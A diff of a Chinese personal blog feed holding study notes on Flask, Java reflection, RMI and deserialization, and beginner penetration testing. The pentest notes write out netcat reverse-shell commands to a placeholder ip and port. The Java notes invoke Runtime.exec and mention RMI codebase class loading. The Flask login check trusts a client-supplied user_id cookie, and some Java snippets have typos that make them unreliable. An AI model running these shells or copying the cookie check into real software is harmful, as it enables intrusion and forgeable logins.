+<p>dynamic：    会返回一个query对象(查询集)，可以继续使用其他查询方法，如all()</p>
+<p>select：    首次访问到属性的时候，就会加载该属性的数据</p>
+<p>joined：    在对关联的两个表进行join操作，从而获取到所有相关的对象</p>
+<p>True：    返回一个可用的列表对象，同select</p>
+</blockquote>
+<h1 id="九、前端页面渲染的一些函数操作"><a href="#九、前端页面渲染的一些函数操作" class="headerlink" title="九、前端页面渲染的一些函数操作"></a>九、前端页面渲染的一些函数操作</h1><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>capitalize</td>
+<td>首字母大写</td>
+</tr>
+<tr>
+<td>upper</td>
+<td>全部大写</td>
+</tr>
+<tr>
+<td>lower</td>
+<td>全部小写</td>
+</tr>
+<tr>
+<td>title</td>
+<td>每个单词首字母大写</td>
+</tr>
+<tr>
+<td>trim</td>
+<td>去掉两边的空白</td>
+</tr>
+<tr>
+<td>striptags</td>
+<td>去掉所有的HTML标签</td>
+</tr>
+<tr>
+<td>safe</td>
+<td>即删除标签，又保留标签功能</td>
+</tr>
+</tbody></table>
+<p>我们就可以在html页面中去使用</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>模板<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello &#123;&#123; name|capitalize &#125;&#125; ! <span class="tag">&lt;/<span class="name">h1</span>&gt;</span>	</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这样就可以去便利我们对参数的使用</p>
+<h1 id="十、实践操作–个人简易博客的搭建"><a href="#十、实践操作–个人简易博客的搭建" class="headerlink" title="十、实践操作–个人简易博客的搭建"></a>十、实践操作–个人简易博客的搭建</h1><h2 id="1、更加清晰分明的文件结构："><a href="#1、更加清晰分明的文件结构：" class="headerlink" title="1、更加清晰分明的文件结构："></a>1、更加清晰分明的文件结构：</h2><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/650f1da2ad366d5775354e62a0abfe6f--661f--image-20231125193419163.png" alt="image-20231125193419163"></p>
+<p>由于需要有前端显示和后端管理两个层面，所以将视图文件，模板文件，以及静态文件分为两个，并且专门创建了一个文件夹去存放，这样就能去更清晰的去文件分类。</p>
+<h2 id="2、代码编写中的一些知识学习"><a href="#2、代码编写中的一些知识学习" class="headerlink" title="2、代码编写中的一些知识学习"></a>2、代码编写中的一些知识学习</h2><h3 id="1-装饰器的使用"><a href="#1-装饰器的使用" class="headerlink" title="1)装饰器的使用"></a>1)装饰器的使用</h3><p>对登录界面使用装饰器进行简化，并且解决flask中使用两次同个装饰器的报错。</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="comment">#装饰器 ---登入验证</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login_required</span>(<span class="params">fn</span>):</span><br><span class="line"><span class="meta">    @wraps(<span class="params">fn</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        user_id = request.cookies.get(<span class="string">&#x27;user_id&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> user_id:</span><br><span class="line">            user = AdminUserModel.query.get(user_id)</span><br><span class="line">            request.user = user</span><br><span class="line">            <span class="keyword">return</span> fn(*args, **kwargs)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">&#x27;/admin/login/&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> inner</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-前端js代码的修改"><a href="#2-前端js代码的修改" class="headerlink" title="2)前端js代码的修改"></a>2)前端js代码的修改</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    $(<span class="string">&quot;#main table tbody tr td a&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> that = $(<span class="variable language_">this</span>);</span><br><span class="line">        <span class="keyword">var</span> id = that.<span class="title function_">attr</span>(<span class="string">&quot;aid&quot;</span>);  <span class="comment">//对应id</span></span><br><span class="line">        <span class="keyword">if</span> (event.<span class="property">srcElement</span>.<span class="property">outerText</span> == <span class="string">&quot;删除&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="title function_">confirm</span>(<span class="string">&quot;此操作不可逆，是否确认？&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">                $.<span class="title function_">post</span>(<span class="string">&#x27;/admin/delarticle/&#x27;</span>, &#123;<span class="string">&#x27;id&#x27;</span>: id&#125;, <span class="keyword">function</span> (<span class="params">data</span>)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="property">msg</span>)</span><br><span class="line">                    <span class="keyword">if</span>(data.<span class="property">code</span> == <span class="number">200</span>)&#123;</span><br><span class="line">                        location.<span class="title function_">reload</span>()</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="title function_">alert</span>(data.<span class="property">msg</span>)</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@admin.route(<span class="params"><span class="string">&#x27;/admin/delarticle/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_del_article</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="built_in">id</span> = request.form.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">        article = ArticleModel.query.get(<span class="built_in">id</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            db.session.delete(article)</span><br><span class="line">            db.session.commit()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;e:&#x27;</span>, e)</span><br><span class="line">            db.session.rollback()</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">500</span>, <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;删除失败！&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">200</span>, <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;删除成功！&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">400</span>, <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;请求方式错误！&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>进行前后端的数据交互，通过判断请求方法区决定不同的操作对于路由而言，从而去实现不同的功能，这里就是去利用了json数据与前端的交互，从而完成了页面相应和后台数据的关联。</p>
+]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+        <tag>flask</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>java反序列化以及一些前置知识</title>
+    <url>/2023/11/09/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9A%84%E4%B8%80%E4%BA%9B%E8%87%AA%E6%88%91%E7%90%86%E8%A7%A3/</url>
+    <content><![CDATA[<p>最近学习了java反序列化的相关知识，就在这稍微做一些总结。</p>
+<span id="more"></span>
+
+<h1 id="一、java反射"><a href="#一、java反射" class="headerlink" title="一、java反射"></a>一、java反射</h1><p>首先就是介绍总结一下java反射中用到的一些相关方法，当然也不是直接对着方法名记忆，那样太枯燥了，主要就是在使用的过程中去学习。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="comment">//这个的意思就是获取到java.lang.Runtime这个类，是一种获取类最常见的方法，然后获取到的类就被“等同”于clazz（！！！这里要想起来类和对象之间的区别，这两个不是同一种东西！！！）</span></span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(clazz.newInstance(), <span class="string">&quot;id&quot;</span>);</span><br><span class="line"><span class="comment">//这里我们就逐步分析，首先就是getMethod就是获取一个类的方法</span></span><br><span class="line"><span class="comment">//格式： 类.getMethod（“方法名”, 这个方法需要传递的参数类型）</span></span><br><span class="line"><span class="comment">//然后就是invoke，这是一个调用上面获得的方法。</span></span><br><span class="line"><span class="comment">//格式： 方法名.(类的一个对象,需要传递给方法的参数)</span></span><br><span class="line"><span class="comment">//newInstance就是调用该类的构造方法去实例化一个对象</span></span><br></pre></td></tr></table></figure>
+
+<p>当然这样直接去运行时会产生报错的！！！这又是为什么呢？</p>
+<p>这里主要就是因为我们无法通过newInstance去获得类的对象，而这里是因为Runtime的构造方法是私有的，是一种”单例”的设计模式</p>
+<blockquote>
+<p>单例的设计模式：主要是考虑到某些类一般只需要类的初始化时使用一次构造方法，而不是每次都需要去再重新使用构造方法，但这样的话我们又应该怎么样去调用构造方法呢？所以设计者就设计了一个静态方法，像这里的就是getRuntime这个方法，使用这个方法就会返回一个对象</p>
+</blockquote>
+<p>所以修改之后的代码就是</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">clazz</span> = class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">runtime</span> <span class="operator">=</span> getRuntimeMethed.invoke(clazz);</span><br><span class="line">execMethod.invoke(runtime,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这样就可以去调用到我们需要的方法了。</p>
+<p>当然这样也是还有点缺点的，就比如如果没有这个getRuntime的方法呢？这又应该怎么办？</p>
+<p>这个时候就可以使用getConstructor这个方法去获取到我们想要的类。</p>
+<blockquote>
+<p>格式： 类.getConstructor(构造方法的参数类型)</p>
+</blockquote>
+<p>eg.</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">clazz</span> = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)));</span><br></pre></td></tr></table></figure>
+
+<p>然后就是如果构造方法是私有方法，我们应该去使用getDeclaredMethod这个方法。</p>
+<blockquote>
+<p>getMethod 系列方法获取的是当前类中所有公共方法，包括从父类继承的方法 </p>
+<p>getDeclaredMethod 系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私 有的方法，但从父类里继承来的就不包含了</p>
+<p>还有就是getConstructor和getDeclaredConstructor基本上相似的，这里就不过多解释了</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">clazz</span> = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">m</span> <span class="operator">=</span> clazz.getDeclaredConstructor();</span><br><span class="line">m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>setAccessible必须要设置为true，不然无法去使用。</p>
+<h1 id="二、RMI"><a href="#二、RMI" class="headerlink" title="二、RMI"></a>二、RMI</h1><p>RMI全称是Remote Method Invocation，远程⽅法调⽤。听这名字应该也就知道，就是去从调用一个远程主机上的java方法，在这里就挑一些重点的代码片段进行讲解。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>());(这里是服务器上启动的)</span><br></pre></td></tr></table></figure>
+
+<p>首先第一行这里就是创建并且执行Registry服务，这个服务就是相当于一个中继器，我将类和一个名字绑定丢到这里面去，别的人就可以通过名字去拿到这个对应的类，这就是Registry所起到的一个作用。然后就是第二行，就是将本机的一个类给绑定到了一个Registry服务上，这样等之后就可以去直接拿到这个类了。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">RMIServer.<span class="type">IRemoteHelloWorld</span> <span class="variable">hello</span> <span class="operator">=</span> (RMIServer.IRemoteHelloWorld)Naming.lookup(<span class="string">&quot;rmi://vps_ip:1099/Hello&quot;</span>);(本机运行)</span><br></pre></td></tr></table></figure>
+
+<p>这里就通过Naming的lookup方法去寻找这个rmi类，我们就可以在Registry中拿到我们想要的类。</p>
+<p>codebase的利用方法</p>
+<p>在以前的有段时间，java是可以运行在浏览器上的，就有一个codebase属性，这是一个地址，去告诉哪个地方寻找类，这个时候我们就可以使用rmi的相关操作，去使其加载我们自己部署的服务器上的一些恶意类。</p>
+<p>就比如在log4j这个CVE中，也是可以去使用rmi去实现的，去完成反弹shell从而获得权限。</p>
+<h1 id="三、serialize🌟"><a href="#三、serialize🌟" class="headerlink" title="三、serialize🌟"></a>三、serialize🌟</h1><p>这是学习的重难点，我现在也还知识初步了解一些，还没完全弄完😭</p>
+<p>一般web手初识反序列化都是从php开始，首先就java的反序列化和php的还是有很大区别的，php是直接利用serialize和unserialize这两个函数进行序列化和反序列化的过程，我们无法去控制这个过程中的任何东西，而java就不一样了。</p>
+<blockquote>
+<ul>
+<li>writeObject：序列化</li>
+<li>readObject：反序列化</li>
+</ul>
+</blockquote>
+<p>这两个主要是java中序列化反序列化所需要使用到的，一般需要搭配一些其他的东西去使用。</p>
+<p>eg</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">     <span class="type">FileOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;result.txt&quot;</span>);  <span class="comment">//用于保存序列化数据</span></span><br><span class="line">     ObjectOutputStream obj_out=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);   <span class="comment">//实例化一个对象输出流</span></span><br><span class="line">     <span class="type">User</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">     u.setName(<span class="string">&quot;6pc1&quot;</span>);</span><br><span class="line">     obj_out.writeObject(u);   <span class="comment">//利用writeObject方法将序列化对象存储在本地</span></span><br><span class="line">     obj_out.close();</span><br><span class="line">     System.out.println(<span class="string">&quot;User对象序列化成功！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">     <span class="type">FileInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;result.txt&quot;</span>);  <span class="comment">//读取之前保存的序列化数据</span></span><br><span class="line">     <span class="type">ObjectInputStream</span> <span class="variable">ins</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);  <span class="comment">//实例化一个对象输入流</span></span><br><span class="line">     <span class="type">User</span> <span class="variable">u</span> <span class="operator">=</span> (User)ins.readObject();      <span class="comment">//利用readObject方法将序列化对象转为对象</span></span><br><span class="line">     system.out.println(<span class="string">&quot;User对象反序列化成功！&quot;</span>);</span><br><span class="line">     System.out.println(u.getName());</span><br><span class="line">     ins.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这就是java反序列话的主要过程，是可以自己去操作序列化反序列化的一些过程的，就比如在序列化后的文件中添加一些数据一类的</p>
+<p>这也不是唯一一种，我们也可以用byte流的方法代替文件流</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">ObjectOutputStream obj_out=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ins</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>java</category>
+      </categories>
+      <tags>
+        <tag>java</tag>
+        <tag>serialize</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>渗透测试学习之路</title>
+    <url>/2023/11/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/</url>
+    <content><![CDATA[<p>已经决定了准备暑假看看去找个实习，对于web手来说，渗透肯定是必不可少的，所以从现在开始，也要抓紧时间去好好学下渗透的相关知识了。</p>
+<span id="more"></span>
+
+<h1 id="1、第1天：基础入门-操作系统-名词-文件下载-反弹SHELL-防火墙绕过"><a href="#1、第1天：基础入门-操作系统-名词-文件下载-反弹SHELL-防火墙绕过" class="headerlink" title="1、第1天：基础入门-操作系统&amp;名词&amp;文件下载&amp;反弹SHELL&amp;防火墙绕过"></a>1、第1天：基础入门-操作系统&amp;名词&amp;文件下载&amp;反弹SHELL&amp;防火墙绕过</h1><blockquote>
+<p>一些参考的资料工具网站</p>
+<p>渗透常见术语<a href="https://www.cnblogs.com/sunny11/p/13583083.html">https://www.cnblogs.com/sunny11/p/13583083.html</a></p>
+<p>渗透中下载：<a href="https://forum.ywhack.com/bountytips.php?download">https://forum.ywhack.com/bountytips.php?download</a></p>
+<p>反弹shell：<a href="https://forum.ywhack.com/reverse-shell/">https://forum.ywhack.com/reverse-shell/</a></p>
+<p>常见命令：<a href="https://blog.csdn.net/weixin_43303273/article/details/83029138">https://blog.csdn.net/weixin_43303273/article/details/83029138</a></p>
+</blockquote>
+<h2 id="1、内网与外网的区别"><a href="#1、内网与外网的区别" class="headerlink" title="1、内网与外网的区别"></a>1、内网与外网的区别</h2><p>外网就是正常我们使用的服务器那种的，我们可以直接通过ip地址去访问，而内网则是在一小范围中使用的，无法直接通过其ip地址去直接找到，这个时候我们只能通过建立通道或者端口指定从而去指定到我们需要访问的内网，就比如虚拟机的ip，就相当于一个内网地址。</p>
+<h2 id="2、出网和进网"><a href="#2、出网和进网" class="headerlink" title="2、出网和进网"></a>2、出网和进网</h2><p>Windows的防火墙对于出网限制很少，而对于进网则有着很大的限制。</p>
+<p>所以在一般情况下，我们使用带有防火墙的主机去将cmd权限发出，使用没有防火墙的主机去连接，防火墙这样就不会起到阻拦的作用了。</p>
+<h2 id="3、反弹shell"><a href="#3、反弹shell" class="headerlink" title="3、反弹shell"></a>3、反弹shell</h2><blockquote>
+<p>Windows：nc -e cmd ip port</p>
+<p>Linux:   nc -e &#x2F;bin&#x2F;bash ip port</p>
+</blockquote>
+<p>内网可以连接外网，外网无法去连接内网。</p>
+<h2 id="4、实战"><a href="#4、实战" class="headerlink" title="4、实战"></a>4、实战</h2><p>①将cmd上传至目标服务器</p>
+<p>②将cmd权限发出，并使用外网主机接受</p>
+<p>③拿到权限，从而去完成渗透</p>
+<h1 id="2、第2天：基础入门-Web应用-架构搭建-漏洞-HTTP数据包-代理服务器"><a href="#2、第2天：基础入门-Web应用-架构搭建-漏洞-HTTP数据包-代理服务器" class="headerlink" title="2、第2天：基础入门-Web应用&amp;架构搭建&amp;漏洞&amp;HTTP数据包&amp;代理服务器"></a>2、第2天：基础入门-Web应用&amp;架构搭建&amp;漏洞&amp;HTTP数据包&amp;代理服务器</h1><h2 id="1、网站的开发"><a href="#1、网站的开发" class="headerlink" title="1、网站的开发"></a>1、网站的开发</h2><p>这里也就是一些基础的web知识了，学会去购买服务器，域名等，并且以此去搭建一个自己的博客项目，这样也能去更好的理解一下网站的结构等相关知识。在这里就不过多的去讲解了，这都可以自己跟着网上的资料去学习的。</p>
+<h2 id="2、web应用框架"><a href="#2、web应用框架" class="headerlink" title="2、web应用框架"></a>2、web应用框架</h2><p>理解不同WEB应用组成角色功能架构：</p>
+<p>开发语言，程序源码，中间件容器，数据库类型，服务器操作系统，第三方软件等。</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-29/e0c18ac5a06e048e519805fbc591a642--032f--image-20231129155607968.png" alt="image-20231129155607968"></p>
+<h2 id="3、代理以及抓包"><a href="#3、代理以及抓包" class="headerlink" title="3、代理以及抓包"></a>3、代理以及抓包</h2><p>可以使用bp去实现抓到请求包，并且去修改从而达到我们想要的效果。</p>
+<p>然后就是可以根据响应包的状态码去判断状态。</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-29/f9ff913739a0803b75f280912eff5134--c28f--image-20231129155736090.png" alt="image-20231129155736090"></p>
+<h2 id="4、代理购买的作用"><a href="#4、代理购买的作用" class="headerlink" title="4、代理购买的作用"></a>4、代理购买的作用</h2><p>在网上去购买代理，就可以实现每次点击网站使用的就是不同的ip地址，这样就能去防止自身的ip被拉入黑名单后无法访问的问题。购买代理就像是在主机和被访问服务器之间新增了一个代理服务器，由这个服务器把你的请求拦截并由它发出，最后接收到的返回包也由它经手返回</p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>python学习历程(1)</title>
+    <url>/2023/11/11/python%E5%AD%A6%E4%B9%A0%E5%8E%86%E7%A8%8B-1/</url>
+    <content><![CDATA[<p>最近也是大二了，好不容易终于接到了大创了，不过大创需要我们去深入学习python，加上打算去参加一个python的项目制作，再去想想我那python水平，简直一言难尽，只能抓紧时间赶快补了😱</p>
+<p>这里就简单记录一下一些我没有什么印象的或者感觉比较重要的知识点。</p>
+<span id="more"></span>
+
+<h1 id="一、python参数中的一些特殊参数"><a href="#一、python参数中的一些特殊参数" class="headerlink" title="一、python参数中的一些特殊参数"></a>一、python参数中的一些特殊参数</h1><p>首先就需要先去了解一下什么是位置参数和关键字参数分别是什么。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">standard_arg</span>(<span class="params">arg</span>):</span><br><span class="line">    <span class="built_in">print</span>(arg)</span><br><span class="line">    </span><br><span class="line">standard_arg(<span class="number">123</span>)   //位置参数，多个参数需要注意排序位置</span><br><span class="line">standard_arg(arg=<span class="number">21</span>)   //关键字参数</span><br></pre></td></tr></table></figure>
+
+<p>函数定义中未使用 <code>/</code> 和 <code>*</code> 时，参数可以按位置或关键字传递给函数。</p>
+<h2 id="1、仅位置参数"><a href="#1、仅位置参数" class="headerlink" title="1、仅位置参数"></a>1、仅位置参数</h2><p>仅限位置时，形参的顺序很重要，并且这些参数在传参时必须使用位置参数传参</p>
+<p>仅限位置形参应放在 <code>/</code> （正斜杠）前。<code>/</code> 用于在逻辑上分割仅限位置形参与其它形参。如果函数定义中没有 <code>/</code>，则表示没有仅限位置形参</p>
+<h2 id="2、仅关键词参数"><a href="#2、仅关键词参数" class="headerlink" title="2、仅关键词参数"></a>2、仅关键词参数</h2><p>把形参标记为 <em>仅限关键字</em>，表明必须以关键字参数形式传递该形参，应在参数列表中第一个 <em>仅限关键字</em> 形参前添加 <code>*</code>。</p>
+<h2 id="3、实例"><a href="#3、实例" class="headerlink" title="3、实例"></a>3、实例</h2><p>请看下面的函数定义示例，注意 <code>/</code> 和 <code>*</code> 标记：</p>
+<p>&gt;&gt;&gt;</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">standard_arg</span>(<span class="params">arg</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(arg)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">pos_only_arg</span>(<span class="params">arg, /</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(arg)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">kwd_only_arg</span>(<span class="params">*, arg</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(arg)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">combined_example</span>(<span class="params">pos_only, /, standard, *, kwd_only</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(pos_only, standard, kwd_only)</span><br></pre></td></tr></table></figure>
+
+<p>第一个函数定义 <code>standard_arg</code> 是最常见的形式，对调用方式没有任何限制，可以按位置也可以按关键字传递参数：</p>
+<p>&gt;&gt;&gt;</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>standard_arg(<span class="number">2</span>)</span><br><span class="line"><span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>standard_arg(arg=<span class="number">2</span>)</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p>第二个函数 <code>pos_only_arg</code> 的函数定义中有 <code>/</code>，仅限使用位置形参：</p>
+<p>&gt;&gt;&gt;</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>pos_only_arg(<span class="number">1</span>)</span><br><span class="line"><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pos_only_arg(arg=<span class="number">1</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: pos_only_arg() got some positional-only arguments passed <span class="keyword">as</span> keyword arguments: <span class="string">&#x27;arg&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>第三个函数 <code>kwd_only_args</code> 的函数定义通过 <code>*</code> 表明仅限关键字参数：</p>
+<p>&gt;&gt;&gt;</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>kwd_only_arg(<span class="number">3</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: kwd_only_arg() takes <span class="number">0</span> positional arguments but <span class="number">1</span> was given</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>kwd_only_arg(arg=<span class="number">3</span>)</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+<p>最后一个函数在同一个函数定义中，使用了全部三种调用惯例：</p>
+<p>&gt;&gt;&gt;</p>
